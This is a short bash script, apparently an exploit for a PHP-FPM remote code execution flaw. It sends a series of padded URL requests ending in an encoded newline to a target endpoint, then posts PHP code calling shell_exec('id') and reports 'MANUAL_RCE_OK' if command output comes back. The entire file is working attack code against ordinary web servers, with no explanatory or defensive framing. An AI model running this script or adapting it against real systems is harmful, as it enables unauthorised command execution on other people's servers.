#!/bin/bash
# PHP-FPM — Manual QSL brute-force injection (no phuip-fpizdam)
# Usage: manual_inject.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

echo "[*] 手动 QSL 暴力注入..."
for qsl in $(seq 1750 5 1850); do
  padding=$(python3 -c "print('A' * $qsl)")
  curl -s "${ENDPOINT}/index.php/${padding}%0a" \
    --max-time 3 > /dev/null 2>&1
done
sleep 1
echo "[*] 尝试验证..."
for i in $(seq 1 30); do
  result=$(curl -s -X POST "${ENDPOINT}/index.php" \
    -d "<?php echo shell_exec('id'); ?>" \
    --max-time 3 2>/dev/null)
  if echo "$result" | grep -q "uid="; then
    echo "$result"
    echo "MANUAL_RCE_OK"
    exit 0
  fi
done
echo "MANUAL_FAILED"
